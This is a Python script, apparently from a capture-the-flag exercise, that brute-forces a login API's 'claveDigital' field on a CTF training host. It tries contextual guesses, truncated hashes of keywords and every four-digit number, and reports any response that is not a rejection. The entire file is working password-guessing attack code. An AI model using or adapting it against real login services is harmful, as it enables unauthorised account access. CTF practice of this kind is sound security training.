#!/usr/bin/env python3
"""
CTF Chile - FUERZA BRUTA FINAL DE CLAVE DIGITAL
Último intento con contexto específico del CTF
"""
import requests
import hashlib

TARGET = "http://training-pod2.ctfchile.com:32778"

def test_key(key):
    try:
        r = requests.post(TARGET + "/api/login",
                         headers={"Content-Type": "application/json"},
                         json={"username": "vault", "claveDigital": str(key)},
                         timeout=5)

        print(f"Probando: {key} -> {r.status_code}")

        if "incorrecta" not in r.text and r.status_code != 401:
            print(f"🏆 ÉXITO: {key}")
            print(f"Respuesta: {r.text}")
            return True

    except Exception as e:
        print(f"Error con {key}: {e}")

    return False

print("🚨 FUERZA BRUTA FINAL - CONTEXTO CTF")
print("=" * 50)

# Claves específicas del contexto
contextual_keys = [
    # Nombres del CTF
    "infiltracion",
    "profunda",
    "omnivault",
    "robo",
    "boveda",
    "ctfchile",

    # Fechas (asumiendo mayo 2024)
    "20240514",  # Fecha de hoy
    "14052024",
    "051424",
    "1405",
    "2024",

    # Números relacionados con puertos/IPs
    "32778",     # Puerto del CTF
    "10160209",  # IP interna
    "209",
    "160",

    # Valores específicos encontrados
    "285212736",  # 0x11000040 en decimal
    "268435456",  # 0x10000000 en decimal
    "268435520",  # 0x10000040 en decimal

    # Combinaciones de hex
    "111000404099",
    "40991100",
    "4099",

    # Strings simples
    "password",
    "secret",
    "key",
    "digital",
    "chile",
    "flag",
    "ctf",

    # Números típicos
    "111111",
    "000000",
    "123456789",
    "987654321",
]

print(f"Probando {len(contextual_keys)} claves contextuales...")

for key in contextual_keys:
    if test_key(key):
        exit(0)

print("\n🔐 Probando hashes de strings contextuales...")

# Hashes de strings relacionadas
for base_string in ["infiltracion", "omnivault", "vault", "profunda", "robo"]:
    # MD5 parcial
    md5_hash = hashlib.md5(base_string.encode()).hexdigest()
    test_key(md5_hash[:8])  # Primeros 8 chars
    test_key(md5_hash[-8:]) # Últimos 8 chars

    # SHA256 parcial
    sha256_hash = hashlib.sha256(base_string.encode()).hexdigest()
    test_key(sha256_hash[:12])

print("\n🎲 Probando combinaciones numéricas...")

# Patrones numéricos
for i in range(1000, 9999):
    test_key(str(i))
    if i % 1000 == 0:
        print(f"   ... probado hasta {i}")

print("\n❌ Búsqueda exhaustiva completada sin éxito")
print("💡 La clave digital podría requerir:")
print("   • Información específica no disponible públicamente")
print("   • Datos del organizador del CTF")
print("   • Pistas en archivos que no hemos accedido")
print("="*50)